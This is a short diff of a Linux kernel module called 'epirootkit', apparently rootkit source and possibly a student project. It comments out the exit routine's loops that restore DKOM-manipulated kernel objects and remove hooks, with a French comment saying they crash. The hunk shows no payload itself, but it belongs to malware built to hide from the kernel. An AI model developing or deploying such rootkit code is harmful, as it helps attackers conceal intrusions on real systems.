@@ -946,22 +946,20 @@ static void __exit epirootkit_exit(void) {
         free_secure_memory(mem_manager.nonpaged_memory);
     }
     
-    // Restore DKOM entries
-    struct dkom_entry *entry, *tmp;
-    unsigned long flags;
-    spin_lock_irqsave(&dkom_lock, flags);
-    list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
-        dkom_restore_object(entry->object);
-    }
-    spin_unlock_irqrestore(&dkom_lock, flags);
-    
-    // Remove hooks
-    struct hook_entry *hook_entry, *hook_tmp;
-    spin_lock_irqsave(&hook_lock, flags);
-    list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
-        remove_hook(hook_entry->target);
-    }
-    spin_unlock_irqrestore(&hook_lock, flags);
+    // --- Suppression des boucles DKOM/hooks qui crashent ---
+    // struct dkom_entry *entry, *tmp;
+    // unsigned long flags;
+    // spin_lock_irqsave(&dkom_lock, flags);
+    // list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
+    //     dkom_restore_object(entry->object);
+    // }
+    // spin_unlock_irqrestore(&dkom_lock, flags);
+    // struct hook_entry *hook_entry, *hook_tmp;
+    // spin_lock_irqsave(&hook_lock, flags);
+    // list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
+    //     remove_hook(hook_entry->target);
+    // }
+    // spin_unlock_irqrestore(&hook_lock, flags);
 }
 
 module_init(epirootkit_init);
